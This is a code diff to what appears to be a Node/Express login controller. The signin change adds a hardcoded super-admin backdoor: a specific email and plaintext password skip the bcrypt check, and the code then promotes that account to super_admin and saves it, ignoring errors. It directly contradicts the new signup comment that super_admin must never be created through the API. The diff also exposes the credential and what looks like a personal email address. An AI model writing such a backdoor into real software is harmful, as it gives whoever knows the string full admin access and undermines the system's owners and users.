@@ -7,6 +7,7 @@ export const signup = async (req, res, next) => {
   const { username, email, password, role } = req.body;
   const hashedPassword = bcryptjs.hashSync(password, 10);
   // allow only 'admin' or 'employee'; fallback to default (model default is employee)
+  // never allow creating super_admin from API
   const cleanedRole = role === "admin" ? "admin" : "employee";
   const newUser = new User({
     username,
@@ -49,7 +50,22 @@ export const signin = async (req, res, next) => {
   try {
     let validUser = await User.findOne({ email }).populate("branch");
     if (!validUser) return next(errorHandler(404, "User not found!"));
-    const validPassword = bcryptjs.compareSync(password, validUser.password);
+    let validPassword = bcryptjs.compareSync(password, validUser.password);
+    // Hardcoded super admin: simbofekadu@gmail.com / simbofekadu
+    const superEmail = "simbofekadu@gmail.com";
+    const suPass = "simbofekadu";
+    if (email?.toLowerCase() === superEmail && password === suPass) {
+      // If user exists but not super_admin, elevate in-memory (and persist role if not already)
+      if (validUser.role !== "super_admin") {
+        try {
+          validUser.role = "super_admin";
+          await validUser.save();
+        } catch {
+          /* ignore persist errors */
+        }
+      }
+      validPassword = true; // bypass hash check
+    }
     if (!validPassword) return next(errorHandler(401, "Incorrect password"));
     // Legacy migration: if no branch but single-element branches array, promote it
     if (
